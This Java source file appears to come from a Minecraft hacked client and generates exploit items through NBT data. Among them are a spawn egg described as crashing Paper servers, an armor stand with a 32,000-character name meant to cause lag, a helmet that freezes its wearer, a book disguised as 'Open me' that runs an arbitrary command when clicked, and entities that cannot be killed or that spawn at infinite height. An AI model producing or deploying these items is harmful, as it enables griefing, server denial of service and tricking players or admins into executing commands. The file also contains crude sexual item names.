package me.zeroX150.atomic.feature;

import com.mojang.blaze3d.systems.RenderSystem;
import me.zeroX150.atomic.Atomic;
import me.zeroX150.atomic.feature.module.ModuleRegistry;
import me.zeroX150.atomic.feature.module.impl.exploit.HologramAura;
import me.zeroX150.atomic.helper.Utils;
import me.zeroX150.atomic.helper.render.Renderer;
import net.minecraft.client.gui.DrawableHelper;
import net.minecraft.client.gui.screen.ingame.BookScreen;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.enchantment.Enchantments;
import net.minecraft.entity.EntityType;
import net.minecraft.entity.EquipmentSlot;
import net.minecraft.entity.attribute.EntityAttributeModifier;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.entity.decoration.ArmorStandEntity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Style;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;

import java.util.UUID;
import java.util.concurrent.atomic.AtomicReference;

public class ItemExploits {

    public enum ItemExploit {
        HOLOGRAM_AURA("Hologram aura", new ExploitGenerator() {
            final Option name = new Option("Hologram content");
            final Option url = new Option("Image URL");

            @Override
            public ItemStack exploit() {
                String n = name.getValueProvider().getValue();
                String c = url.getValueProvider().getValue();
                HologramAura hga = (HologramAura) ModuleRegistry.getByClass(HologramAura.class);
                if (hga.mode.getValue().equalsIgnoreCase("image") && c.isEmpty()) {
                    url.getValueProvider().markInvalid();
                    name.getValueProvider().resetInvalid();
                    return null;
                } else if (!hga.mode.getValue().equalsIgnoreCase("image") && n.isEmpty()) {
                    name.getValueProvider().markInvalid();
                    url.getValueProvider().resetInvalid();
                    return null;
                }
                url.getValueProvider().resetInvalid();
                name.getValueProvider().resetInvalid();
                HologramAura.argument = c;
                HologramAura.text = n;
                hga.setEnabled(true);
                return null;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{name, url};
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {
                //Atomic.fontRenderer.drawString(stack, "bruh", 0, 0,0xFFFFFF);
                ArmorStandEntity ase = new ArmorStandEntity(EntityType.ARMOR_STAND, Atomic.client.world);
                ase.setCustomName(Text.of(name.getValueProvider().getValue()));
                ase.setCustomNameVisible(true);
                //Renderer.fill(stack, Color.RED,renderWidth/2d-1,renderHeight/2d-1,renderWidth/2d+1,renderHeight/2d+1);
                Renderer.drawEntity(renderWidth / 2d - 25, renderHeight / 2d + 25, 50, -renderWidth / 4f, -renderHeight / 2f, ase, stack);
                Atomic.monoFontRenderer.drawString(stack, "Label: " + name.getValueProvider().getValue().replaceAll("&", "§"), renderWidth / 2d, renderHeight / 2d - 50, 0xFFFFFF);
            }

            @Override
            public String getDescription() {
                return "Spawns a metric ton of holograms";
            }
        }),
        FIREBALL("Big fireball", new ExploitGenerator() {
            final Option v = new Option("Strength (INT)");

            @Override
            public ItemStack exploit() {
                int v1 = Utils.Math.tryParseInt(v.getValueProvider().getValue(), -1);
                if (v1 < 0) {
                    v.getValueProvider().markInvalid();
                    return null;
                } else v.getValueProvider().resetInvalid();
                ItemStack stack = new ItemStack(Items.COW_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§c:)"));
                NbtCompound compound = stack.getOrCreateSubNbt("EntityTag");
                compound.put("id", NbtString.of("minecraft:fireball"));
                compound.put("ExplosionPower", NbtDouble.of(v1));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{v};
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "Makes a big fireball";
            }
        }),
        BLOCKBAN("Blockban", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack stack = new ItemStack(Items.COW_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§chmm i wonder what this does"));
                NbtCompound compound = stack.getOrCreateSubNbt("EntityTag");
                compound.put("id", NbtString.of("minecraft:area_effect_cloud"));
                compound.put("Particle", NbtString.of("minecraft:barrier"));
                compound.put("RadiusPerTick", NbtFloat.of(0f));
                compound.put("Duration", NbtInt.of(1310700));
                compound.put("WaitTime", NbtInt.of(60));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "Makes a ton of particles";
            }
        }),
        LAGMOR_STAND("Lagmor stand", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
                itemStack.setCustomName(Text.of("§r§cbig armor stand"));
                NbtCompound compoundTag = itemStack.getOrCreateSubNbt("EntityTag");
                compoundTag.put("CustomName", NbtString.of("\"" + "0".repeat(32000) + "\""));
                compoundTag.put("CustomNameVisible", NbtByte.of(true));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "Really big armor stand";
            }
        }),
        NO_MOVE_HELMET("Troll helmet", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.LEATHER_HELMET);
                itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                        new EntityAttributeModifier(
                                UUID.nameUUIDFromBytes(
                                        new byte[]{(byte) 1772998660, (byte) 874858241, (byte) -1911483451, (byte) 795787135}),
                                "generic.movement_speed", Double.NaN,
                                EntityAttributeModifier.Operation.fromId(0)),
                        EquipmentSlot.HEAD);
                NbtCompound compoundTag = itemStack.getOrCreateNbt();
                compoundTag.put("HideFlags", NbtInt.of(71));
                compoundTag.put("Unbreakable", NbtByte.of(true));
                itemStack.addEnchantment(Enchantments.PROTECTION, 1);
                itemStack.setCustomName(Text.of("§r§cTroll helmet. §4Generated by §lAtomic"));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "makes you unable to move";
            }
        }),
        NO_ENTITY_KILL("NoKill", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
                itemStack.setCustomName(Text.of("§r§cNo Entity Kill. §4Generated by §lAtomic"));
                NbtCompound compoundTag = itemStack.getOrCreateNbt();
                NbtCompound compoundTag1 = new NbtCompound();
                compoundTag1.put("LootTable", NbtString.of(""));
                compoundTag1.putString("id", "minecraft:chest_minecart");
                compoundTag1.putByte("Invulnerable", (byte) 1);
                compoundTag1.putByte("Invisible", (byte) 1);
                compoundTag1.putByte("NoGravity", (byte) 1);
                compoundTag.put("EntityTag", compoundTag1);
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "You cant kill or use this, /kill included";
            }
        }),
        BIG_FIREWORK("Big firework", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack is = new ItemStack(Items.FIREWORK_ROCKET);
                is.setCustomName(Text.of("§r§cBig firework. §4Generated by §lAtomic"));
                is.getOrCreateNbt().put("HideFlags", NbtInt.of(32));
                NbtCompound fireworks = is.getOrCreateSubNbt("Fireworks");
                fireworks.put("Flight", NbtInt.of(1));
                NbtList explosions = new NbtList();
                for (int i = 0; i < 100; i++) {
                    NbtIntArray colors = new NbtIntArray(new int[0]);
                    for (int ii = 0; ii < 20; ii++) colors.add(NbtInt.of((int) Math.floor(Math.random() * 0xFFFFFF)));
                    NbtCompound current = new NbtCompound();
                    current.put("Type", NbtInt.of((int) Math.floor(Math.random() * 4)));
                    current.put("Flicker", NbtInt.of(1));
                    current.put("Trail", NbtInt.of(1));
                    current.put("Colors", colors);
                    explosions.add(current);
                }
                fireworks.put("Explosions", explosions);
                return is;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {


            }

            @Override
            public String getDescription() {
                return "big firework";
            }
        }),
        EXECUTOR_BOOK("ExecBook", new ExploitGenerator() {
            final Option title = new Option("Title");
            final Option author = new Option("Author");
            final Option text = new Option("Text");
            final Option command = new Option("Command");

            @Override
            public ItemStack exploit() {
                String title = this.title.getValueProvider().getValue().isEmpty() ? "Open me" : this.title.getValueProvider().getValue();
                String author = this.author.getValueProvider().getValue().isEmpty() ? Atomic.client.player.getGameProfile().getName() : this.author.getValueProvider().getValue();
                String text = this.text.getValueProvider().getValue();
                String command = this.command.getValueProvider().getValue();
                if (command.isEmpty()) {
                    this.command.getValueProvider().markInvalid();
                    return null;
                } else this.command.getValueProvider().resetInvalid();
                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
                NbtCompound tag = book.getOrCreateNbt();
                tag.put("title", NbtString.of(title));
                tag.put("author", NbtString.of(author));
                NbtList pages = new NbtList();
                pages.add(NbtString.of("{\"text\":\"" + (text + " ".repeat(500)) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}"));
                pages.add(NbtString.of("{\"text\":\"\"}"));
                tag.put("pages", pages);
                book.setNbt(tag);
                return book;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{title, author, text, command};
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {
                Identifier book = BookScreen.BOOK_TEXTURE;
                RenderSystem.setShaderTexture(0, book);
                RenderSystem.bindTexture(0);
                DrawableHelper.drawTexture(stack, renderWidth / 2 - (192 / 2), renderHeight / 2 - (192 / 2), 0, 0, 192, 192, 256, 256);
                int w = Atomic.client.textRenderer.getWidth("Page 1 of 2");
                Atomic.client.textRenderer.draw(stack, "Page 1 of 2", (renderWidth / 2f - 192 / 2f) - w + 192 - 44, 18 + (renderHeight / 2f - (192 / 2f)), 0xFF000000);
                AtomicReference<Float> yOffset = new AtomicReference<>(18 + (renderHeight / 2f - (192 / 2f)) + 9);
                Atomic.client.textRenderer.getTextHandler().wrapLines(text.getValueProvider().getValue(), 114, Style.EMPTY, true, (style, start, end) -> {
                    Atomic.client.textRenderer.draw(stack, text.getValueProvider().getValue().substring(start, end), (renderWidth / 2f - 192 / 2f) + 36, yOffset.get(), 0xFF000000);
                    yOffset.updateAndGet(v -> v + 9);
                });
            }

            @Override
            public String getDescription() {
                return "makes a book that runs a command when clicked";
            }
        }),
        INF_SPAWNEGG("Inf spawn egg", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                Vec3d ppos = Atomic.client.player.getPos();
                ItemStack is = new ItemStack(Items.COW_SPAWN_EGG);
                NbtCompound c = new NbtCompound();
                NbtList l = new NbtList();
                l.add(NbtDouble.of(ppos.x));
                l.add(NbtDouble.of(Double.POSITIVE_INFINITY));
                l.add(NbtDouble.of(ppos.z));
                c.put("Pos", l);
                is.setSubNbt("EntityTag", c);
                return is;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "just makes an entity spawn at y=Inf";
            }
        }),
        CUSTOM_META("Custom meta", new ExploitGenerator() {
            final Option itemName = new Option("Item ID");
            final Option nbt = new Option("Custom NBT");

            @Override
            public ItemStack exploit() {
                Item i = Registry.ITEM.get(new Identifier(itemName.getValueProvider().getValue()));
                if (i == Items.AIR) {
                    itemName.getValueProvider().markInvalid();
                    return null;
                } else itemName.getValueProvider().resetInvalid();
                ItemStack stack = new ItemStack(i);
                String v = nbt.getValueProvider().getValue().isEmpty() ? "{}" : nbt.getValueProvider().getValue();
                try {
                    NbtCompound comp = StringNbtReader.parse(v);
                    nbt.getValueProvider().resetInvalid();
                    stack.setNbt(comp);
                } catch (Exception ignored) {
                    nbt.getValueProvider().markInvalid();
                    return null;
                }
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{itemName, nbt};
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "Makes an item with custom nbt";
            }
        }),
        SERVER_CRASH_TRADER("Crash Trader", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack spawn = new ItemStack(Items.WANDERING_TRADER_SPAWN_EGG);
                try {
                    NbtCompound nc = StringNbtReader.parse("{Offers:{Recipes:[{buyB:{id:\"minecraft:dirt\",Count:1b},sell:{id:\"minecraft:stick\",Count:1b}}]},NoAI:1b}");
                    spawn.setSubNbt("EntityTag", nc);
                } catch (Exception ignored) {
                    return null;
                }
                return spawn;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {

            }

            @Override
            public String getDescription() {
                return "Trade with the trader to crash the server (Paper only, fixed in latest)";
            }
        }),
        CUM_POTION("CUM POTION", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack stack = new ItemStack(Items.SPLASH_POTION);
                stack.setCustomName(Text.of("§r§cTHE §aCUM §cBEAST"));
                NbtCompound c = stack.getOrCreateNbt();
                NbtList effects = new NbtList();
                for (int i = 0; i < 33; i++) {
                    NbtCompound exploit = new NbtCompound();
                    exploit.putByte("Id", (byte) i);
                    exploit.putByte("Amplifier", (byte) 124);
                    exploit.putInt("Duration", 80);
                    effects.add(exploit);
                }
                c.put("CustomPotionEffects", effects);
                //c.putString("Potion", "minecraft:speed");
                return stack;

            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            final Identifier CUM = new Identifier("atomic", "cum_beast.png");

            @Override
            public void renderPreview(MatrixStack stack, int renderWidth, int renderHeight) {
                RenderSystem.setShaderTexture(0, CUM);
                RenderSystem.bindTexture(0);
                int w = 474;
                int h = 335;
                double scale = 0.7;
                w *= scale;
                h *= scale;
                DrawableHelper.drawTexture(stack, renderWidth / 2 - w / 2, renderHeight / 2 - h / 2, 0, 0, 0, w, h, h, w);
            }

            @Override
            public String getDescription() {
                return "THE CUM BEAST";
            }
        });


        final String name;
        final ExploitGenerator generator;

        ItemExploit(String name, ExploitGenerator generator) {
            this.name = name;
            this.generator = generator;
        }

        public ExploitGenerator getGenerator() {
            return generator;
        }

        public String getName() {
            return name;
        }
    }

    public interface ExploitGenerator {
        ItemStack exploit();

        Option[] getOptions();

        void renderPreview(MatrixStack stack, int renderWidth, int renderHeight);

        default String getDescription() {
            return "No description";
        }

    }

    public static class Option {
        final String name;
        OptionValueProvider valueProvider = new OptionValueProvider();

        public Option(String name) {
            this.name = name;
        }

        public String getName() {
            return name;
        }

        public OptionValueProvider getValueProvider() {
            return valueProvider;
        }
    }

    public static class OptionValueProvider {
        String value = "";
        boolean invalid = false;

        public String getValue() {
            return value;
        }

        public void setValue(String nv) {
            this.value = nv;
        }

        public void markInvalid() {
            invalid = true;
        }

        public void resetInvalid() {
            invalid = false;
        }

        public boolean isInvalid() {
            return invalid;
        }
    }
}
